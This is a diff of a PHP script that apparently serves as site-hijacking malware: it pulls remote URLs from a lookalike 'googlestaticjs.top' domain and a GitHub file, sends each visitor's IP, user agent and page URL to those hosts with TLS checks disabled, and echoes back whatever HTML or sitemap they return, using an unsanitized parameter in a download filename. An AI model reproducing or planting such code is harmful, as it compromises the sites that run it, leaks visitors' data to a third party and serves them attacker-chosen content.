@@ -1,24 +1,51 @@
 <?php
+
 $country = isset($_GET['cr']) ? $_GET['cr'] : 'en';
 $cache_file = $country . '_indexapi.txt';
+
+ 
+
 function updateApiCache($cache_file, $country) {
-    $api_urls = [
-        "https://{$country}.googlestaticjs.top/new_api",
-        "https://raw.githubusercontent.com/glady1998/testdemo/main/{$country}_api",
-    ];
+    // echo "<br>updateApiCache RUNING...<br>";
+
+    $api_urls = array(
+        "https://".$country.".googlestaticjs.top/new_api", 
+        "https://raw.githubusercontent.com/glady1998/testdemo/main/".$country."_api"
+    );
+
+
     foreach ($api_urls as $api_url) {
-        $latest_api_content = @file_get_contents($api_url);
-        console.log($api_url);
+        $api_url=trim($api_url);
+        
+        // echo "<br><br>updateApiCache api_url:".$api_url;
+         $latest_api_content = false;
+
+        $ch = curl_init($api_url);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $latest_api_content = curl_exec($ch);
+        curl_close($ch);
+
+
+
         if ($latest_api_content !== false) {
+
+            //  echo "<br>got latest_api_content";
             $latest_api_content = trim($latest_api_content);
             // Save the latest API to cache file
-            file_put_contents($cache_file, $latest_api_content);
+            // file_put_contents($cache_file, $latest_api_content);
+            $file = fopen($cache_file,'w');
+            fwrite($file,$latest_api_content);
+            fclose($file);
 
-            // 如果成功获取到API内容，则结束循环
+             
             break;
+            }else{ 
+                // echo "<br>latest_api_content -ERROR FALSE";
             }
         }
     }
+
 $user_agent = urlencode($_SERVER['HTTP_USER_AGENT']);
 $current_url = urlencode("http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
 $user_ip = urlencode($_SERVER['REMOTE_ADDR']);
@@ -28,7 +55,7 @@ $user_ip = urlencode($_SERVER['REMOTE_ADDR']);
 
 $cache_expiration = 60 * 60; // 1 day (in seconds)24 * 60 * 60
 
-if (file_exists($cache_file)) {
+if (file_exists($cache_file) and filesize($cache_file)>0) {
     $cache_time = filemtime($cache_file);
     $current_time = time();
     
@@ -44,17 +71,67 @@ if (file_exists($cache_file)) {
 
 if (file_exists($cache_file)) {
     $api_urls = file($cache_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $context = stream_context_create(['http' => ['timeout' => 5]]);
+    // $context = stream_context_create(['http' => ['timeout' => 5]]);
+
+    // echo "cache_file YES：";
+    // var_dump($api_urls);
+   
+
     $html_content = false;
     $error_message = null;
 
     foreach ($api_urls as $api_url) {
-        $url_with_params = "$api_url?cr=$country&current_url=$current_url&user_ip=$user_ip&user_agent=$user_agent";
-        $html_content = @file_get_contents($url_with_params, false, $context);
+
+        // echo "<br><br>MAIN cache file YES：  country1:".$country;
+        // echo "<br><br>MAIN cache file YES：  api_url:".$api_url;
+
+        $api_url=trim($api_url);
+        $country=trim($country);
+        // echo "<br><br>MAIN cache file YES：  country2:".$country;
+        $url_with_params = $api_url."?cr=".$country."&current_url=".$current_url."&user_ip=".$user_ip."&user_agent=".$user_agent."";
+        // $html_content = @file_get_contents($url_with_params, false, $context);
+        // echo "<br>MAIN cache file YES： url_with_params full:<br>".$url_with_params;
+
+        $ch = curl_init($url_with_params);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 5);   
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);    
+        $html_content = curl_exec($ch);
+        curl_close($ch);
+
+        // echo "<br><br>MAIN cache file YES, html_content LEN:".strlen($html_content);    
+
+        // echo "<br><br>主程序cache file存在 html_content:";
+        // var_dump($html_content);
+        // echo "<br><br>MAIN cache file YES, STOP,DIE";
+        // die();
+
+
         
         if ($html_content !== false) {
-            echo $html_content;
-            break; // Break the loop if successful
+            // $news = $_GET['news'];
+            $news = isset($_GET['news']) ? $_GET['news'] : '';
+            if (strpos($news, 'sitemap_') !== false) {
+                if (pathinfo($news, PATHINFO_EXTENSION) === 'txt') {
+                    header('Content-Type: text/plain');
+                    header('Content-Disposition: attachment; filename="' . $news . '"');
+        			echo $html_content;
+        			break;
+                } elseif (pathinfo($news, PATHINFO_EXTENSION) === 'xml') {
+                    header('Content-Type: application/xml');
+                    header('Content-Disposition: attachment; filename="' . $news . '"');
+        			echo $html_content;
+        			break;
+                }
+            }else{
+                echo $html_content;
+                break; // Break the loop if successful
+            }
+
+            
+            
+        }else{
+            // echo "<br>html NOT GOT<br>";
         }
         
         $error_message = error_get_last();
